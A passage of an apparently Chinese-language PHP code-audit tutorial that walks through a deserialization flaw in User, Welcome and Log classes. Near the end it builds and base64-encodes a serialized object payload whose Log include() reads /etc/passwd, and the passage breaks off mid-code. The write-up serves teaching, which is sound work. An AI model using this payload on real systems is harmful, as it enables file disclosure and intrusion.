&quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">class</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Welcome</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">public</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">function</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> handler</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$val</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  echo </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"Hello "</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> $val</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">;</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">class</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">User</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">private</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> $name</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">;</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">private</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> $wel</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">;</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">function</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> __construct</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$name</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  $this</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">name </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> $name</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">;</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  $this</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">wel </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">new</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Welcome</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">();</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">function</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> __destruct</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">()</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(150, 152, 150);">//echo "bye\n";</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  $this</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">wel</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">handler</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$this</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">name</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">);</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">?&gt;</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">log.class.php</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;; height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal; "><pre data-lang="undefined" style=" -webkit-tap-highlight-color: transparent;display: grid; counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace; "><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&lt;?</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">php</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">class</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(0, 134, 179);">Log</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">private</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> $type_log</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">;</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">function</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> __costruct</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$hnd</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  $this</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$type_log </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> $hnd</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">;</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">public</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(167, 29, 93);">function</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> handler</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$val</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">{</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  include</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">$this</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">-&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">type_log</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">);</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  echo </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">"LOG: "</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> $val</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">;</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">  </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">}</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">?&gt;</span></span></code></pre></section><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">看到index.php可以看到new了一个user对象，然后通过序列化加base64加密</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.36363636363636365" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/44_RA5qib9qZjXFicibXSe0ic1wOLDpVA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIfgKJqjias9A7Lt9SqoJiaeDfoT46fORA5qib9qZjXFicibXSe0ic1wOLDpVA/640?wx_fmt=png'" data-type="png" data-w="781" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">转到user.class.php</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.9679358717434869" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/45_crsuSibtCjNAG7kkWVVlMr71BLIbPA.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIUX7PPAOHsnQW2HAJBla47Ec89icrsuSibtCjNAG7kkWVVlMr71BLIbPA/640?wx_fmt=png'" data-type="png" data-w="499" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">因为new了一个对象所以执行construct()，然后destruct()的时候调用handler方法输出sk4</p><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">转到log.class.php，可以很明确的看到有个文件包含</p><figure style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;"><img data-ratio="0.6471861471861472" src="图片/HACK学习呀_2021-07-05_代码审计记一次PHP入门代码审计/46_nTQxkq1lSZMW9tTWjnlcR4Sh1P6NdQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou8WZ2ZXgKbkfK6DEjegCZiaIClYV6ic6RJkosRMqibmyGtq7n7nTQxkq1lSZMW9tTWjnlcR4Sh1P6NdQ/640?wx_fmt=png'" data-type="png" data-w="462" style="margin: 0.1em auto 0.5em;-webkit-tap-highlight-color: transparent;line-height: 1.75;border-radius: 4px;display: block;" title="null"></figure><p style="margin: 1.5em 8px;-webkit-tap-highlight-color: transparent;font-size:14px;line-height:34px;;white-space: normal;text-align: left;color: rgb(63, 63, 63);line-height: 1.75;font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.1em;">这里构造payload就很简单了 O:4:"User":2:{s:10:"\x00User\x00name";s:5:"admin";s:9:"\x00User\x00wel";O:3:"Log":1:{s:8:"type_log";s:11:"/etc/passwd";}} 但是这里的空格用\x00转义一下然后同理bs4转码</p><section class="code-snippet__github" style=" margin: 10px 8px;-webkit-tap-highlight-color: transparent;display: flex;font-size:12px;line-height:32px;; height: auto;background-color: rgb(247, 247, 247);border-radius: 8px;color: rgb(0, 0, 0);font family: &quot;Microsoft YaHei&quot;;text-align: start;white-space: normal; "><pre data-lang="undefined" style=" -webkit-tap-highlight-color: transparent;display: grid; counter-reset: line 0;overflow-x: auto;padding: 1em;-webkit-box-flex: 1;flex: 1 1 0%;line-height: 20px;font family: &quot;Operator Mono&quot;, Consolas, Monaco, Menlo, monospace; "><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span class="code-snippet_outer" style="-webkit-tap-highlight-color: transparent;"><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">&gt;&gt;&gt;</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> s </span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">=</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);"> base64</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">.</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">b64encode</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">(</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">b</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(24, 54, 145);">'O:4:"User":2:{s:10:"\x00User\x00name";s:5:"admin";s:9:"\x00User\x00wel";O:3:"Log":1:{s:8:"type_log";s:11:"/etc/passwd";}}'</span><span style="-webkit-tap-highlight-color: transparent;color: rgb(51, 51, 51);">)</span></span></code><code style=" -webkit-tap-highlight-color: transparent;font family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;display: flex; padding-right: 8px;border-width: 0px !important;border-style: initial !important;border-color: initial !important; "><span 